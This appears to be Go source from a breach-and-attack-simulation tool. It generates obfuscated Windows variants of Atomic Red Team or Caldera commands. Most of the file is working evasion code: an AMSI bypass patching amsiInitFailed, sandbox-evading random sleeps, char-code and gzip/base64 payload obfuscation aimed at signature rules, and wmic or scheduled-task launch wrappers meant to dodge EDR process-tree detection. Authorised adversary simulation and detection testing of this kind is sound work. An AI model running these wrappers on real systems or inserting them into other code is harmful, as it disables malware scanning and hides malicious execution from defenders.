// Package variant implements server-side generation of technique execution
// variants — different encodings, execution contexts, and evasion wrappers
// applied to a base ART or Caldera command. The agent receives fully-transformed
// command strings and executes them; all intelligence stays server-side.
package variant

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"
)

// Generate produces all valid Windows variant Templates for a base PowerShell
// command. baseScript is the raw PowerShell script body (the executor body,
// NOT the powershell.exe invocation). Returns an empty slice for non-Windows
// executors — Linux variants are Phase 4.
func Generate(techniqueID, baseType, baseID, baseScript, executor string) []Template {
	if executor != "powershell" && executor != "cmd" {
		return nil
	}
	if baseScript == "" {
		return nil
	}

	encodings := []string{EncPlain, EncBase64, EncGzipB64, EncCharCode}
	contexts := []string{CtxPowershellDirect, CtxCmdPowershell, CtxWMI, CtxSchedTask}
	evasions := []string{EvasionNone, EvasionAMSIPatch, EvasionSleepJitter}

	var out []Template
	now := time.Now().UTC()

	for _, enc := range encodings {
		for _, ctx := range contexts {
			for _, ev := range evasions {
				cmd, agentExecutor, ok := buildCommand(baseScript, enc, ctx, ev, techniqueID, baseID)
				if !ok {
					continue
				}
				out = append(out, Template{
					ID:          TemplateID(techniqueID, baseID, enc, ctx, ev),
					TechniqueID: techniqueID,
					BaseType:    baseType,
					BaseID:      baseID,
					Encoding:    enc,
					ExecContext: ctx,
					Evasion:     ev,
					Platform:    "windows",
					Executor:    agentExecutor,
					Command:     cmd,
					CreatedAt:   now,
				})
			}
		}
	}
	return out
}

// TemplateID returns a stable, deterministic string ID for a variant combination.
func TemplateID(techniqueID, baseID, enc, ctx, ev string) string {
	return techniqueID + "|" + baseID + "|" + enc + "|" + ctx + "|" + ev
}

// buildCommand produces the final transformed command + executor for a variant.
// Returns ok=false for combinations that are invalid or produce unreliable results.
func buildCommand(baseScript, enc, ctx, ev, techniqueID, baseID string) (cmd, executor string, ok bool) {
	// Apply evasion wrapper to the raw script body.
	ps := applyEvasion(baseScript, ev)

	// Encode the script body.
	encoded, err := encodePS(ps, enc)
	if err != nil {
		return "", "", false
	}

	// Wrap in execution context.
	cmd, executor = wrapContext(encoded, enc, ctx, techniqueID, baseID)
	return cmd, executor, cmd != ""
}

// applyEvasion prepends an evasion snippet to the PS script body before encoding.
func applyEvasion(ps, ev string) string {
	switch ev {
	case EvasionAMSIPatch:
		// Patches amsiInitFailed via reflection — prevents AMSI from scanning
		// the script before execution. Bypasses signature-based PS blocking.
		bypass := `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`
		return bypass + " " + ps
	case EvasionSleepJitter:
		// Random 3–12 second sleep before executing — evades sandbox time-limited
		// detonation and makes timing-based correlation harder.
		return `Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 12);` + " " + ps
	default:
		return ps
	}
}

// encodePS applies the chosen encoding to the script body.
func encodePS(ps, enc string) (string, error) {
	switch enc {
	case EncPlain:
		return ps, nil

	case EncBase64:
		// PowerShell -EncodedCommand expects UTF-16LE bytes, then standard base64.
		return base64.StdEncoding.EncodeToString(encodeUTF16LE(ps)), nil

	case EncGzipB64:
		var buf bytes.Buffer
		gz := gzip.NewWriter(&buf)
		if _, err := gz.Write([]byte(ps)); err != nil {
			return "", err
		}
		gz.Close()
		return base64.StdEncoding.EncodeToString(buf.Bytes()), nil

	case EncCharCode:
		// Build a char-code array expression that reconstructs and invokes the script.
		// Evades string-pattern detection rules that scan the literal script text.
		return buildCharCode(ps), nil
	}
	return ps, nil
}

// encodeUTF16LE encodes a string as UTF-16 Little Endian bytes.
func encodeUTF16LE(s string) []byte {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}
	return b
}

// buildCharCode converts a script to a PowerShell char-code array iex expression.
func buildCharCode(s string) string {
	runes := []rune(s)
	codes := make([]string, len(runes))
	for i, r := range runes {
		codes[i] = fmt.Sprintf("%d", r)
	}
	return fmt.Sprintf("iex([char[]](%s)-join'')", strings.Join(codes, ","))
}

// wrapContext produces the final agent-ready command line and executor type
// for the given encoded script body and execution context.
func wrapContext(encoded, enc, ctx, techniqueID, baseID string) (cmd, executor string) {
	switch ctx {
	case CtxPowershellDirect:
		switch enc {
		case EncBase64:
			// Use cmd executor so the agent doesn't double-wrap with -Command.
			return "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded, "cmd"
		case EncGzipB64:
			decomp := gzipDecompressExpr(encoded)
			return `powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(decomp) + `"`, "cmd"
		default: // plain or charcode
			return encoded, "powershell"
		}

	case CtxCmdPowershell:
		switch enc {
		case EncBase64:
			return "cmd.exe /c powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded, "cmd"
		case EncGzipB64:
			decomp := gzipDecompressExpr(encoded)
			return `cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(decomp) + `"`, "cmd"
		default:
			return `cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(encoded) + `"`, "cmd"
		}

	case CtxWMI:
		// WMI process creation via wmic — spawns a new process tree, bypassing
		// parent-child relationships that EDR rules often key on.
		var psInvocation string
		switch enc {
		case EncGzipB64:
			return "", "" // gzip + WMI quoting nesting is unreliable; skip.
		case EncBase64:
			psInvocation = "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded
		default:
			psInvocation = `powershell.exe -NoProfile -NonInteractive -Command "` + escapeForWMI(encoded) + `"`
		}
		return `wmic.exe process call create "` + escapeForWMI(psInvocation) + `"`, "cmd"

	case CtxSchedTask:
		// Scheduled task via schtasks — creates task, runs it, waits, deletes.
		// Task name is deterministic per variant so cleanup is reliable.
		taskName := "BAS-V-" + variantShortHash(techniqueID, baseID, enc)
		var psInvocation string
		switch enc {
		case EncGzipB64:
			return "", "" // gzip + schtasks quoting nesting is unreliable; skip.
		case EncBase64:
			psInvocation = "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded
		default:
			psInvocation = `powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(encoded) + `"`
		}
		return fmt.Sprintf(
			`schtasks.exe /create /tn "%s" /tr "%s" /sc once /st 00:00 /f && schtasks.exe /run /tn "%s" && timeout /t 15 /nobreak >nul && schtasks.exe /delete /tn "%s" /f`,
			taskName, psInvocation, taskName, taskName,
		), "cmd"
	}
	return "", ""
}

// gzipDecompressExpr is the PowerShell one-liner that decompresses a gzip+b64
// payload at runtime and invokes it.
func gzipDecompressExpr(b64 string) string {
	return fmt.Sprintf(
		`$d=[Convert]::FromBase64String('%s');$ms=New-Object IO.MemoryStream(,$d);$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);iex(New-Object IO.StreamReader($gz)).ReadToEnd()`,
		b64,
	)
}

// escapePSInCmd escapes a PowerShell expression for embedding inside a
// cmd.exe double-quoted argument (e.g. cmd /c powershell.exe -Command "...").
func escapePSInCmd(s string) string {
	return strings.ReplaceAll(s, `"`, `\"`)
}

// escapeForWMI escapes a string for embedding inside a wmic process call create
// double-quoted argument. wmic uses single quotes inside the outer double quotes.
func escapeForWMI(s string) string {
	return strings.ReplaceAll(s, `"`, `'`)
}

// variantShortHash returns a deterministic 6-char hex from variant dimensions,
// used as a unique-but-stable scheduled task name component.
func variantShortHash(parts ...string) string {
	h := sha256.Sum256([]byte(strings.Join(parts, "|")))
	return hex.EncodeToString(h[:3])
}
